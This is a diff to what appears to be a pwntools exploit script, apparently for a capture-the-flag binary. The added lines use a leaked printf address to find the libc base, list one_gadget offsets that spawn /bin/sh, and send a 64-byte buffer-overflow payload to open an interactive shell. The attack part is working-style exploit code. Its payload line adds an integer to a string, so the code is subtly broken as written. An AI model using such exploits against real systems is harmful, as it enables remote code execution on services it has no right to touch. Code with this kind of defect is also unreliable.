@@ -144,4 +144,34 @@ def leak_printf_got(start_main_addr):
 	print("[!!!] Leaked libc printf : " + libc_printf)
 	return int(libc_printf,16)
 
-leak_printf_got(start_main_addr)
+libc_printf = leak_printf_got(start_main_addr)
+
+#https://libc.blukat.me/ search with printf f70, download and try the libc.so one by one
+'''
+one_gadget libc6_2.27-3ubuntu1.4_amd64.so
+0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+
+0x4f432 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a41c execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+
+'''
+
+libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')
+libc_base = libc_printf - libc.sym['printf']
+libc.address = libc_base
+offset = 64
+payload = offset*'A'
+payload += libc_base + 0x4f432 + '\x00'*0x70
+io.recv()
+io.sendline(b'1')
+io.recvuntil('>>')
+io.sendline(payload.encode())
+io.interactive()
